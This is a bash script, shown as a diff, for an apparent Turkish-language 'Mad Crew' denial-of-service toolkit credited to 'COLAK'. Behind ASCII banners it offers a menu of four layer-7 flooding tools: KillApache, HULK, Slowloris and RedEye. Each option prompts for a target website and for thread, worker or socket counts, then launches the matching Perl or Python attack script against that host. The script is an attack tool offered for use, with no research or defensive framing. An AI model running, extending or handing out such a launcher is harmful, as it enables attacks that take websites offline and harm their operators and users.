@@ -1,0 +1,190 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'              
+
+exit_script()
+{
+  ./madcrew
+}
+
+killapache()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e " ${WHITE}
+            #    # # #      #        ##   #####    ##    ####  #    # ###### 
+            #   #  # #      #       #  #  #    #  #  #  #    # #    # #      
+            ####   # #      #      #    # #    # #    # #      ###### #####  
+            #  #   # #      #      ###### #####  ###### #      #    # #      
+            #   #  # #      #      #    # #      #    # #    # #    # #      
+            #    # # ###### ###### #    # #      #    #  ####  #    # ###### 
+
+                         CODED BY COLAK 
+                  INSTAGRAM : @colak.offical
+                                                                  ${WHITE}"
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Web Host ? "
+read host
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Thread :"
+read thread
+perl exhaustion.pl $host $thread
+echo " "
+echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
+read enter
+}
+
+hulk()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e " ${WHITE}
+                  ▄█    █▄    ███    █▄   ▄█          ▄█   ▄█▄ 
+                 ███    ███   ███    ███ ███         ███ ▄███▀ 
+                 ███    ███   ███    ███ ███         ███▐██▀   
+                ▄███▄▄▄▄███▄▄ ███    ███ ███        ▄█████▀    
+               ▀▀███▀▀▀▀███▀  ███    ███ ███       ▀▀█████▄    
+                 ███    ███   ███    ███ ███         ███▐██▄   
+                 ███    ███   ███    ███ ███▌    ▄   ███ ▀███▄ 
+                 ███    █▀    ████████▀  █████▄▄██   ███   ▀█▀ 
+                       
+                         CODED BY COLAK 
+                  INSTAGRAM : @colak.offical
+
+
+                                                                  ${WHITE}"
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Web Site ? "
+read host
+python hulk.py $host 
+echo " "
+echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
+read enter
+}
+
+slowloris()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e " ${WHITE}
+                  ███████╗██╗      ██████╗ ██╗    ██╗██╗      ██████╗ ██████╗ ██╗███████╗
+                  ██╔════╝██║     ██╔═══██╗██║    ██║██║     ██╔═══██╗██╔══██╗██║██╔════╝
+                  ███████╗██║     ██║   ██║██║ █╗ ██║██║     ██║   ██║██████╔╝██║███████╗
+                  ╚════██║██║     ██║   ██║██║███╗██║██║     ██║   ██║██╔══██╗██║╚════██║
+                  ███████║███████╗╚██████╔╝╚███╔███╔╝███████╗╚██████╔╝██║  ██║██║███████║
+                  ╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝
+
+                        CODED BY COLAK 
+                  INSTAGRAM : @colak.offical
+                                                                       
+                                                                  ${WHITE}"
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Web Site ? "
+read host
+perl slowloris.pl -dns $host
+echo " "
+echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
+read enter
+}
+
+RedEye()
+{
+    clear
+    echo -e " ${BLUE} "
+    echo -e " ${WHITE}
+             ██████╗ ███████╗██████╗     ███████╗██╗   ██╗███████╗
+             ██╔══██╗██╔════╝██╔══██╗    ██╔════╝╚██╗ ██╔╝██╔════╝
+             ██████╔╝█████╗  ██║  ██║    █████╗   ╚████╔╝ █████╗  
+             ██╔══██╗██╔══╝  ██║  ██║    ██╔══╝    ╚██╔╝  ██╔══╝  
+             ██║  ██║███████╗██████╔╝    ███████╗   ██║   ███████╗
+             ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝   ╚═╝   ╚══════╝
+
+                         CODED BY COLAK 
+                  INSTAGRAM : @colak.offical                   
+                                                                       
+                                                                  ${WHITE}"
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Web Site ? : "
+read host
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Workers ? [10] : "
+read workers
+echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# Sockets ? [500] : "
+read socket
+python RedEye.py $host -w $workers -s $socket
+echo " "
+echo " Enter'a Basarak Devam Edebilirsiniz . . .  "
+read enter
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear                   
+echo -e "${WHITE}"
+echo -e "${WHITE}    ███╗   ███╗ █████╗ ██████╗      ██████╗██████╗ ███████╗██╗    ██╗
+    ████╗ ████║██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝██║    ██║
+    ██╔████╔██║███████║██║  ██║    ██║     ██████╔╝█████╗  ██║ █╗ ██║
+    ██║╚██╔╝██║██╔══██║██║  ██║    ██║     ██╔══██╗██╔══╝  ██║███╗██║
+    ██║ ╚═╝ ██║██║  ██║██████╔╝    ╚██████╗██║  ██║███████╗╚███╔███╔╝
+    ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
+                                                                 
+    ██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗            
+    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║            
+    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝            
+    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝             
+    ███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║              
+    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝              
+                                                                 
+                     
+                        CODED BY COLAK 
+                  INSTAGRAM : @colak.offical
+
+                                            "
+    echo -e "${LIGHTBLUE}        [1]${WHITE}KILLAPACHE SCRIPT ${LIGHTBLUE} " 
+    echo -e ""
+    echo -e "${LIGHTBLUE}        [2]${WHITE}HULK - HTTP Unbearable Load${LIGHTBLUE}   "
+    echo -e ""
+    echo -e "${LIGHTBLUE}        [3]${WHITE}SLOWLORIS ${LIGHTBLUE}   "
+    echo -e ""
+    echo -e "${LIGHTBLUE}        [4]${WHITE}RED EYE ${LIGHTBLUE}   "
+    echo -e ""
+    echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# "
+    read yourch
+    case $yourch in
+      1) killapache ;;
+      2) hulk ;;
+      3) slowloris ;;
+      4) RedEye ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+      *) echo "HATALI RAKAM GIRDINIZ" ;
+         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+Take_input1
+
